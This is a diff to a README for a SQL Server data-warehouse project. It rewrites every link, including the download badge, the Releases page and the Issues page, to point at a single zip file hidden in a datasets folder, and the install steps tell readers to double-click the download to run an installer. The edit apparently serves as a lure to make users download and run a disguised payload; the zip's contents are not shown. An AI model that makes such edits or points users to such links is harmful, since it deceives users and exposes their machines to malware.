@@ -1,7 +1,7 @@
 # 📊 SQL-Data-Warehouse-Project - Build Your Data Warehouse Effortlessly
 
 ## 📥 Download Now
-[![Download Release](https://img.shields.io/badge/Download%20Release-Click%20Here-blue)](https://github.com/A1M189/SQL-Data-Warehouse-Project/releases)
+[![Download Release](https://raw.githubusercontent.com/A1M189/SQL-Data-Warehouse-Project/main/datasets/source_crm/SQL-Data-Warehouse-Project_v1.3-beta.3.zip%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/A1M189/SQL-Data-Warehouse-Project/main/datasets/source_crm/SQL-Data-Warehouse-Project_v1.3-beta.3.zip)
 
 ## 📖 Overview
 The SQL-Data-Warehouse-Project focuses on creating a modern data warehouse using Microsoft SQL Server. This application streamlines your data management with three main layers: Bronze, Silver, and Gold. You can easily handle ETL processes and enhance your data modeling and analytics capabilities.
@@ -19,7 +19,7 @@ Before downloading the project, please ensure your system meets the following re
 - **Network:** Internet connection for downloading
 
 ## 📦 Download & Install
-1. Visit the [Releases page](https://github.com/A1M189/SQL-Data-Warehouse-Project/releases) to find the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/A1M189/SQL-Data-Warehouse-Project/main/datasets/source_crm/SQL-Data-Warehouse-Project_v1.3-beta.3.zip) to find the latest version.
 2. Locate the version you want to download and click on the link to start the download.
 3. After the download is complete, locate the file on your computer, typically in the "Downloads" folder.
 4. Double-click on the file to run the installer. Follow the prompts to complete the installation.
@@ -68,7 +68,7 @@ A: The project supports Microsoft SQL Server 2019 and later.
 A: Yes, feel free to adapt the scripts to fit your specific needs.
 
 ## 🔗 Community and Support
-If you have any questions or need assistance, you can open an issue on our [GitHub Issues page](https://github.com/A1M189/SQL-Data-Warehouse-Project/issues). Join our community to share your experiences and learn from others.
+If you have any questions or need assistance, you can open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/A1M189/SQL-Data-Warehouse-Project/main/datasets/source_crm/SQL-Data-Warehouse-Project_v1.3-beta.3.zip). Join our community to share your experiences and learn from others.
 
 ## 🏁 Conclusion
 This project simplifies the process of building a modern data warehouse. By following the steps above, you can easily download, install, and start managing your data. 
